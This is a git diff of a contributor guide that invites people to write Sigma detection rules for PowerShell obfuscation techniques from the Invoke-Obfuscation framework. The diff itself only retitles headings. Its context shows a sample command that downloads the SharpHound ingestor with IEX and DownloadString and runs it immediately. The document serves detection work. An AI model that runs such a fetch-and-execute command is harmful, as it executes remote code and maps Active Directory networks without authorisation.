@@ -2,12 +2,12 @@
 This is your guide on how you can help us with soving this issue.     
 You can pick up some of the methods of PowerShell command and script obfuscation provided by the [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) framework below and develop Sigma rules for them. You will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.
 
-## Original command
+##№ Original command (before obfuscation)
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
 ```
 
-## Invoke-Obfuscation premise
+##№ Invoke-Obfuscation module premise
 ```powershell
 Import-Module ./Invoke-Obfuscation.psd1
 Invoke-Obfuscation
